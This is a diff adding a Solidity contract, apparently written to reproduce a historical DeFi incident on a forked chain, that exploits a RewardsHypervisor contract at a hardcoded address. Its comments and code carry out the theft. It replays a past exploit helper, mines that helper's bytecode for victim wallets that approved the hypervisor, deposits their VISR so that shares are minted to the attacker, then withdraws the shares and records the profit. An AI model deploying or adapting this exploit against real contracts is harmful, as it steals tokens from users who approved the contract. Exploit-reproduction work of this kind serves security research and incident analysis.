@@ -1,0 +1,223 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+}
+
+interface IRewardsHypervisorLike {
+    function visr() external view returns (address);
+    function vvisr() external view returns (address);
+    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
+    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;
+    address public constant HISTORICAL_HELPER = 0x10C509AA9ab291C76c45414e7CdBd375e1D5AcE8;
+    bytes4 internal constant HISTORICAL_HELPER_SELECTOR = 0x4a0b0c38;
+
+    uint256 private _profitAmount;
+
+    bool public executed;
+    bool public helperCodePresent;
+    bool public helperReplayAttempted;
+    bool public helperReplaySucceeded;
+    address public victimUsed;
+    uint256 public depositAmountUsed;
+    uint256 public victimCandidatesScanned;
+    uint256 public depositAttempts;
+    uint256 public sharesBefore;
+    uint256 public sharesAfter;
+    uint256 public visrBefore;
+    uint256 public visrAfter;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        require(!executed, "already executed");
+        executed = true;
+
+        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
+        address visrToken = hypervisor.visr();
+        address shareToken = hypervisor.vvisr();
+
+        visrBefore = IERC20Like(visrToken).balanceOf(address(this));
+        sharesBefore = IERC20Like(shareToken).balanceOf(address(this));
+
+        // Required exploit ordering remains unchanged:
+        // 1) a victim EOA has already approved RewardsHypervisor for VISR,
+        // 2) the attacker causes deposit(amount, victimEOA, attacker),
+        // 3) the hypervisor pulls VISR from the victim and mints vVISR to the attacker,
+        // 4) the attacker later withdraws the stolen position for underlying VISR.
+        //
+        // The historical exploit helper already exists on-chain at the fork block and the cached
+        // incident transaction in this workspace shows it was invoked with a single zero-arg selector.
+        // Replaying that public helper is the closest on-chain reproduction of the original exploit
+        // causality, and if it mints shares to this verifier we can then redeem them ourselves.
+        bytes memory helperCode = HISTORICAL_HELPER.code;
+        helperCodePresent = helperCode.length != 0;
+        require(helperCodePresent, "historical helper absent at fork");
+
+        _tryHistoricalHelper(shareToken);
+
+        // Fallback: if the helper does not mint shares to this verifier on the selected fork state,
+        // continue to perform the vulnerable deposit directly against RewardsHypervisor using any
+        // exact PUSH20 EOAs embedded in helper bytecode. This preserves the same root exploit path
+        // (victim-approved EOA deposit into attacker-owned shares) without introducing cheatcodes.
+        if (sharesAfter == sharesBefore) {
+            uint256 totalShares = IERC20Like(shareToken).totalSupply();
+            uint256 poolVisr = IERC20Like(visrToken).balanceOf(TARGET);
+            address[] memory seen = new address[](helperCode.length / 21 + 1);
+            uint256 seenCount;
+
+            for (uint256 i = 0; i < helperCode.length && sharesAfter == sharesBefore; ) {
+                uint8 opcode = uint8(helperCode[i]);
+
+                if (opcode == 0x73 && i + 20 < helperCode.length) {
+                    address candidate = address(uint160(_readUint(helperCode, i + 1, 20)));
+
+                    if (_isNewVictimCandidate(candidate, visrToken, shareToken, seen, seenCount)) {
+                        seen[seenCount] = candidate;
+                        unchecked {
+                            ++seenCount;
+                            ++victimCandidatesScanned;
+                        }
+
+                        _tryExploitCandidate(
+                            hypervisor,
+                            visrToken,
+                            shareToken,
+                            candidate,
+                            totalShares,
+                            poolVisr
+                        );
+                    }
+
+                    unchecked {
+                        i += 21;
+                    }
+                } else {
+                    unchecked {
+                        ++i;
+                    }
+                }
+            }
+        }
+
+        require(sharesAfter > sharesBefore, "no stolen shares minted to verifier");
+
+        hypervisor.withdraw(sharesAfter - sharesBefore, address(this), payable(address(this)));
+
+        visrAfter = IERC20Like(visrToken).balanceOf(address(this));
+        require(visrAfter > visrBefore, "no VISR redeemed");
+        _profitAmount = visrAfter - visrBefore;
+    }
+
+    function profitToken() external view returns (address) {
+        return IRewardsHypervisorLike(TARGET).visr();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _tryHistoricalHelper(address shareToken) internal {
+        helperReplayAttempted = true;
+        unchecked {
+            ++depositAttempts;
+        }
+
+        (bool ok, ) = HISTORICAL_HELPER.call(abi.encodeWithSelector(HISTORICAL_HELPER_SELECTOR));
+        if (!ok) {
+            return;
+        }
+
+        uint256 updatedShares = IERC20Like(shareToken).balanceOf(address(this));
+        if (updatedShares > sharesBefore) {
+            helperReplaySucceeded = true;
+            sharesAfter = updatedShares;
+        }
+    }
+
+    function _tryExploitCandidate(
+        IRewardsHypervisorLike hypervisor,
+        address visrToken,
+        address shareToken,
+        address candidate,
+        uint256 totalShares,
+        uint256 poolVisr
+    ) internal {
+        uint256 candidateBalance = IERC20Like(visrToken).balanceOf(candidate);
+        uint256 candidateAllowance = IERC20Like(visrToken).allowance(candidate, TARGET);
+        uint256 stealable = _min(candidateBalance, candidateAllowance);
+
+        if (stealable == 0) {
+            return;
+        }
+
+        if (totalShares != 0 && poolVisr != 0) {
+            uint256 quotedShares = (stealable * totalShares) / poolVisr;
+            if (quotedShares == 0) {
+                return;
+            }
+        }
+
+        unchecked {
+            ++depositAttempts;
+        }
+
+        try hypervisor.deposit(stealable, payable(candidate), address(this)) returns (uint256) {
+            uint256 updatedShares = IERC20Like(shareToken).balanceOf(address(this));
+            if (updatedShares > sharesBefore) {
+                victimUsed = candidate;
+                depositAmountUsed = stealable;
+                sharesAfter = updatedShares;
+            }
+        } catch {
+            // Some exact helper-embedded EOAs may not be approved victims on this fork state.
+        }
+    }
+
+    function _isNewVictimCandidate(
+        address candidate,
+        address visrToken,
+        address shareToken,
+        address[] memory seen,
+        uint256 seenCount
+    ) internal view returns (bool) {
+        if (candidate == address(0)) return false;
+        if (candidate == TARGET) return false;
+        if (candidate == HISTORICAL_HELPER) return false;
+        if (candidate == visrToken) return false;
+        if (candidate == shareToken) return false;
+        if (candidate == address(this)) return false;
+        if (candidate.code.length != 0) return false;
+
+        for (uint256 j = 0; j < seenCount; ) {
+            if (seen[j] == candidate) {
+                return false;
+            }
+            unchecked {
+                ++j;
+            }
+        }
+
+        return true;
+    }
+
+    function _readUint(bytes memory data, uint256 start, uint256 len) internal pure returns (uint256 value) {
+        for (uint256 i = 0; i < len; ) {
+            value = (value << 8) | uint8(data[start + i]);
+            unchecked {
+                ++i;
+            }
+        }
+    }
+
+    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a < b ? a : b;
+    }
+}
